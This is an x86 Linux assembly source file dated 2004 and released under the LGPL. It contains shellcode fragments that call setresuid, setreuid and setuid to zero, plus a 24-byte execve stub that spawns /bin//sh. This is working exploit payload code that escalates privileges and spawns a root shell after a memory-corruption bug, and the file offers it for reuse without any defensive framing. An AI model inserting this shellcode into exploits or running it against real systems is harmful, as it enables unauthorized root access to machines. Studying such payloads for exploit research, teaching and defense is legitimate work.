/*
 *  lin-x86-shellcode.s
 *  Copyright 2004 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

.global _start

_start:

setresuidcode:
    xorl    %ecx,%ecx
    xorl    %ebx,%ebx
    mull    %ebx
    movb    $0xa4,%al
    int     $0x80

setreuidcode:
    xorl    %ecx,%ecx
    xorl    %ebx,%ebx
    pushl   $0x46
    popl    %eax
    int     $0x80

setuidcode:
    xorl    %ebx,%ebx
    pushl   $0x17
    popl    %eax
    int     $0x80

exitcode:
    xorl    %ebx,%ebx
    pushl   $0x01
    popl    %eax
    int     $0x80

# 24 bytes

shellcode:
    xorl    %eax,%eax
    pushl   %eax
    pushl   $0x68732f2f
    pushl   $0x6e69622f
    movl    %esp,%ebx
    pushl   %eax
    pushl   %ebx
    movl    %esp,%ecx
    cltd
    movb    $0x0b,%al
    int     $0x80

